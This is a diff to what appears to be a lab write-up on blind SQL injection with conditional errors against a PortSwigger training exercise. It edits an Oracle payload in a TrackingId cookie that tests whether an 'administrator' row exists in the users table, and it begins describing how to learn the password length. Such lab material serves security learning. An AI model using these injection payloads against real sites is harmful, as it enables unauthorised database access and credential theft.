@@ -131,9 +131,9 @@ TrackingId=xyz'||(SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE 'test' END FROM du
 TrackingId=xyz'||(SELECT CASE WHEN 1=2 THEN TO_CHAR(1/0) ELSE 'test' END FROM dual)--
 ```
 - You can check out the conditional errors payloads for different databases from the [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
-- So now we will check if the administrator is in the `users` table or not by the same previous condition `1=2`.
+- So now we will check if the administrator is in the `users` table or not by using the condition `1=1`.
 ```
-TrackingId=xyz'||(SELECT CASE WHEN 1=2 THEN TO_CHAR(1/0) ELSE 'test' END FROM users WHERE username='administrator')--
+TrackingId=xyz'||(SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE 'test' END FROM users WHERE username='administrator')--
 ```
 - Now, it is left only to know the password, but first, we need to know the length of the password.
 - We will use the condition where if the length of the password is `True`, it will execute the action of `TO_CHAR(1/0)` and the server will respond with the error message.
